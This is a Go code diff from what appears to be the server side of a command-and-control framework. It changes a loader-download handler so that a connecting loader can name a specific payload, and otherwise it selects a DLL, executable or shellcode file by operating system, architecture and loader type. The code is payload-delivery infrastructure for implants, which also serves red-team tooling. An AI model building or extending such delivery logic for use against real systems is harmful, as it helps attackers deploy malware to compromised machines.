@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -44,12 +45,13 @@ type CheckInData struct {
 }
 
 type LoaderData struct {
-	OS           string `json:"os"`
-	Arch         string `json:"arch"`
-	Hostname     string `json:"hostname"`
-	LoaderType   string `json:"loaderType"`
-	AESKeyBase64 string `json:"aesKey"`
-	AESIVBase64  string `json:"aesIV"`
+	OS            string `json:"os"`
+	Arch          string `json:"arch"`
+	Hostname      string `json:"hostname"`
+	LoaderType    string `json:"loaderType"`
+	TargetPayload string `json:"targetPayload"`
+	AESKeyBase64  string `json:"aesKey"`
+	AESIVBase64   string `json:"aesIV"`
 }
 
 type SocketData struct {
@@ -631,60 +633,72 @@ func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState
 		}
 
 		targetPayloadPath := ""
+		// If target payload is specified, download it if it exists.
 		for _, payloadPath := range payloadPaths {
-			// TODO: more accurate check for file info
-
-			if ldrData.OS == "linux" {
-				// TODO
-				// ...
+			if ldrData.TargetPayload != "" && filepath.Base(payloadPath) == ldrData.TargetPayload {
+				targetPayloadPath = payloadPath
+				break
 			}
-			if ldrData.OS == "windows" {
-				if ldrData.LoaderType == "dll-loader" {
-					// Load a DLL file.
-					if ldrData.Arch == "amd64" {
-						if strings.HasSuffix(payloadPath, ".amd64.dll") {
+		}
+		// If target payload is not specified or not found, detect automatically
+		if targetPayloadPath == "" {
+			for _, payloadPath := range payloadPaths {
+				// TODO: more accurate check for file info
+
+				// If target payload is not specified, detect a payload automatically
+				if ldrData.OS == "linux" {
+					// TODO
+					// ...
+				}
+				if ldrData.OS == "windows" {
+					if ldrData.LoaderType == "dll-loader" {
+						// Load a DLL file.
+						if ldrData.Arch == "amd64" {
+							if strings.HasSuffix(payloadPath, ".amd64.dll") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						} else if ldrData.Arch == "i686" {
+							if strings.HasSuffix(payloadPath, ".i686.dll") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						}
+					} else if ldrData.LoaderType == "pe-loader" {
+						// Load an executable file.
+						if ldrData.Arch == "amd64" {
+							if strings.HasSuffix(payloadPath, ".amd64.exe") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						} else if ldrData.Arch == "i686" {
+							if strings.HasSuffix(payloadPath, ".i686.exe") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						}
+					} else if ldrData.LoaderType == "shellcode-loader" {
+						// Load a shellcode (raw) file.
+						if ldrData.Arch == "amd64" {
+							if strings.HasSuffix(payloadPath, ".amd64.bin") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						} else if ldrData.Arch == "i686" {
+							if strings.HasSuffix(payloadPath, ".i686.bin") {
+								targetPayloadPath = payloadPath
+								break
+							}
+						}
+						if strings.HasSuffix(payloadPath, ".bin") {
 							targetPayloadPath = payloadPath
 							break
 						}
-					} else if ldrData.Arch == "i686" {
-						if strings.HasSuffix(payloadPath, ".i686.dll") {
-							targetPayloadPath = payloadPath
-							break
-						}
-					}
-				} else if ldrData.LoaderType == "pe-loader" {
-					// Load an executable file.
-					if ldrData.Arch == "amd64" {
-						if strings.HasSuffix(payloadPath, ".amd64.exe") {
-							targetPayloadPath = payloadPath
-							break
-						}
-					} else if ldrData.Arch == "i686" {
-						if strings.HasSuffix(payloadPath, ".i686.exe") {
-							targetPayloadPath = payloadPath
-							break
-						}
-					}
-				} else if ldrData.LoaderType == "shellcode-loader" {
-					// Load a shellcode (raw) file.
-					if ldrData.Arch == "amd64" {
-						if strings.HasSuffix(payloadPath, ".amd64.bin") {
-							targetPayloadPath = payloadPath
-							break
-						}
-					} else if ldrData.Arch == "i686" {
-						if strings.HasSuffix(payloadPath, ".i686.bin") {
-							targetPayloadPath = payloadPath
-							break
-						}
-					}
-					if strings.HasSuffix(payloadPath, ".bin") {
-						targetPayloadPath = payloadPath
-						break
 					}
 				}
 			}
 		}
+
 		if targetPayloadPath == "" {
 			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
